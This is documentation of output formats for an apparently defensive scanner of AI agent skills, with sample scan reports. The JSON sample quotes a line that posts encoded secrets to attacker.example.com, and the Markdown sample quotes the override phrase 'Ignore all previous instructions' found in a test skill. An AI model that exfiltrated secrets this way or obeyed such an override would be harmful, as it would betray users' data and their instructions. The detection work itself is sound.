# Output Formats

Skill Scanner supports six output formats. Use `--format` to select one and `--output`/`-o` to write to a file.

## Choosing a Format

| Scenario | Recommended format | Why |
|---|---|---|
| Local development triage | `summary` (default) | Human-readable terminal output |
| CI/CD gate | `json` or `sarif` | Machine-parseable; pair with `--fail-on-findings` |
| GitHub Code Scanning | `sarif` | Native upload via `github/codeql-action/upload-sarif` |
| PR comment / issue artifact | `markdown` | Renders directly in GitHub/GitLab |
| Quick terminal overview | `table` | Compact columnar summary |
| Shareable report | `html` | Self-contained interactive report |

## Format Reference

| Format | Flag | Typical use |
|---|---|---|
| Summary | `--format summary` | Local human-readable terminal output |
| JSON | `--format json` | Automation and integrations |
| Markdown | `--format markdown` | Report artifacts in PRs/issues |
| Table | `--format table` | Compact terminal summaries |
| SARIF | `--format sarif` | GitHub Code Scanning |
| HTML | `--format html` | Rich interactive report |

## Sample Output

### Summary (default)

<div class="terminal-demo">
<div class="terminal-header">
<span class="terminal-dot red"></span>
<span class="terminal-dot yellow"></span>
<span class="terminal-dot green"></span>
<span class="terminal-title">skill-scanner scan — summary</span>
</div>
</div>

```txt
$ skill-scanner scan evals/skills/data-exfiltration/environment-secrets
============================================================
Skill: environment-secrets-exfiltrator
============================================================
Status: [FAIL] ISSUES FOUND
Max Severity: CRITICAL
Total Findings: 5
Scan Duration: 0.13s

Findings Summary:
  CRITICAL: 1
      HIGH: 0
    MEDIUM: 4
       LOW: 0
      INFO: 0
```

A clean skill shows:

<div class="terminal-demo">
<div class="terminal-header">
<span class="terminal-dot red"></span>
<span class="terminal-dot yellow"></span>
<span class="terminal-dot green"></span>
<span class="terminal-title">skill-scanner scan — safe result</span>
</div>
</div>

```txt
$ skill-scanner scan evals/skills/safe-skills/simple-math
============================================================
Skill: simple-math
============================================================
Status: [OK] SAFE
Max Severity: SAFE
Total Findings: 0
Scan Duration: 0.12s

```

### JSON

```bash
skill-scanner scan evals/skills/data-exfiltration/environment-secrets --format json
```

```json
{
  "skill_name": "environment-secrets-exfiltrator",
  "skill_path": "/path/to/skill",
  "is_safe": false,
  "max_severity": "CRITICAL",
  "findings_count": 5,
  "findings": [
    {
      "id": "DATA_EXFIL_HTTP_POST_d854dba1dc",
      "rule_id": "DATA_EXFIL_HTTP_POST",
      "category": "data_exfiltration",
      "severity": "CRITICAL",
      "title": "HTTP POST request that may send data externally",
      "description": "Pattern detected: requests.post(\"https://attacker",
      "file_path": "get_info.py",
      "line_number": 56,
      "snippet": "requests.post(\"https://attacker.example.com/secrets\", json={\"data\": encoded}, timeout=5)",
      "remediation": "Review all POST requests. Ensure they don't send sensitive data",
      "analyzer": "static",
      "metadata": {
        "matched_pattern": "...",
        "aitech": "AITech-8.2",
        "aitech_name": "Data Exfiltration / Exposure"
      }
    }
  ],
  "scan_duration_seconds": 0.13,
  "duration_ms": 127,
  "analyzers_used": ["static_analyzer", "bytecode", "pipeline"],
  "timestamp": "2026-02-19T21:58:33.032573",
  "scan_metadata": {
    "policy_name": "default",
    "policy_version": "1.0",
    "policy_preset_base": "balanced",
    "policy_fingerprint_sha256": "45b486..."
  }
}
```

Use `--compact` to remove pretty-printing for machine pipelines.

### Table

<div class="terminal-demo">
<div class="terminal-header">
<span class="terminal-dot red"></span>
<span class="terminal-dot yellow"></span>
<span class="terminal-dot green"></span>
<span class="terminal-title">skill-scanner scan — table</span>
</div>
</div>

```txt
$ skill-scanner scan evals/skills/command-injection/eval-execution --format table
================================================================================
Agent Skill Security Scan: safe-calculator
================================================================================

+----------------+---------------------+
| Skill          | safe-calculator     |
+----------------+---------------------+
| Status         | [FAIL] ISSUES FOUND |
+----------------+---------------------+
| Max Severity   | CRITICAL            |
+----------------+---------------------+
| Total Findings | 5                   |
+----------------+---------------------+
| Scan Duration  | 0.13s               |
+----------------+---------------------+

Findings by Severity:
+----------+-------+
| Severity | Count |
+==========+=======+
| Critical |     5 |
+----------+-------+
| High     |     0 |
+----------+-------+
| Medium   |     0 |
+----------+-------+
| Low      |     0 |
+----------+-------+
| Info     |     0 |
+----------+-------+

Detailed Findings:
+----------+-------------------+---------------------------------------------+-----------------+
| Severity | Category          | Title                                       | Location        |
+==========+===================+=============================================+=================+
| CRITICAL | command_injection | Dangerous code execution functions that ... | calculate.py:18 |
+----------+-------------------+---------------------------------------------+-----------------+
| CRITICAL | command_injection | Dangerous code execution functions that ... | calculate.py:24 |
+----------+-------------------+---------------------------------------------+-----------------+
```

### Markdown

<div class="terminal-demo">
<div class="terminal-header">
<span class="terminal-dot red"></span>
<span class="terminal-dot yellow"></span>
<span class="terminal-dot green"></span>
<span class="terminal-title">skill-scanner scan — markdown</span>
</div>
</div>

```txt
$ skill-scanner scan evals/skills/prompt-injection/jailbreak-override --format markdown
# Agent Skill Security Scan Report

**Skill:** jailbreak-override
**Status:** [FAIL] ISSUES FOUND
**Max Severity:** CRITICAL
**Scan Duration:** 0.12s

## Summary

- **Total Findings:** 1
- **Critical:** 1
- **High:** 0

## Findings

### CRITICAL Severity

#### [CRITICAL] PROMPT INJECTION detected by YARA

**Severity:** CRITICAL
**Category:** prompt_injection
**Rule ID:** YARA_prompt_injection_generic
**Location:** SKILL.md:9

**Description:** Detects prompt strings used to override or force malicious
tool calls: Ignore all previous instructions

## Analyzers

The following analyzers were used:

- static_analyzer
- bytecode
- pipeline
```

Use `--detailed` to include full evidence in Markdown output.

### SARIF

```bash
skill-scanner scan evals/skills/obfuscation/base64-payload --format sarif -o results.sarif
```

```json
{
  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
  "version": "2.1.0",
  "runs": [{
    "tool": {
      "driver": {
        "name": "skill-scanner",
        "version": "1.0.0",
        "informationUri": "https://github.com/cisco-ai-defense/skill-scanner",
        "rules": [{
          "id": "PIPELINE_TAINT_FLOW",
          "name": "Pipeline Taint Flow",
          "shortDescription": { "text": "Dangerous data flow in command pipeline" },
          "defaultConfiguration": { "level": "error" },
          "properties": { "category": "command_injection", "severity": "HIGH" }
        }]
      }
    },
    "results": [{
      "ruleId": "PIPELINE_TAINT_FLOW",
      "level": "error",
      "message": { "text": "Pipeline downloads data from the network and executes it..." },
      "locations": [{
        "physicalLocation": {
          "artifactLocation": { "uri": "process.py" },
          "region": { "startLine": 1 }
        }
      }]
    }]
  }]
}
```

## Reporters

The `summary` format is the default and is implemented directly in the CLI (`skill_scanner/cli/cli.py`) rather than as a standalone reporter module. The remaining five formats each have a dedicated reporter class:

- [`json_reporter.py`](https://github.com/cisco-ai-defense/skill-scanner/blob/main/skill_scanner/core/reporters/json_reporter.py)
- [`markdown_reporter.py`](https://github.com/cisco-ai-defense/skill-scanner/blob/main/skill_scanner/core/reporters/markdown_reporter.py)
- [`table_reporter.py`](https://github.com/cisco-ai-defense/skill-scanner/blob/main/skill_scanner/core/reporters/table_reporter.py)
- [`sarif_reporter.py`](https://github.com/cisco-ai-defense/skill-scanner/blob/main/skill_scanner/core/reporters/sarif_reporter.py)
- [`html_reporter.py`](https://github.com/cisco-ai-defense/skill-scanner/blob/main/skill_scanner/core/reporters/html_reporter.py)

## Practical Notes

- Use `--compact` with JSON for machine pipelines.
- Use `--detailed` with Markdown for deep triage output.
- Use `--fail-on-findings` with SARIF or JSON in CI gates.
- Use `--output`/`-o` to write to a file; omit to print to stdout.
